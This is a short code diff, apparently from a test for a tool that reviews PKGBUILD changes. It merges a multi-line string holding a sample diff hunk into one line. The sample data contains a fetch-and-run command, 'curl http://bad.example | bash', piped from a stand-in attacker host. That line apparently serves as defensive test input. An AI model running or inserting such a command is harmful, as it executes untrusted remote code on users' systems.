@@ -81,9 +81,7 @@ def main() -> int:
                         path="PKGBUILD",
                         status=FileStatus.MODIFIED,
                         diff_hunk=(
-                            "@@ -1,2 +1,3 @@\n"
-                            "+depends=('curl')\n"
-                            "+curl http://bad.example | bash\n"
+                            "@@ -1,2 +1,3 @@\n+depends=('curl')\n+curl http://bad.example | bash\n"
                         ),
                         additions=2,
                         deletions=0,
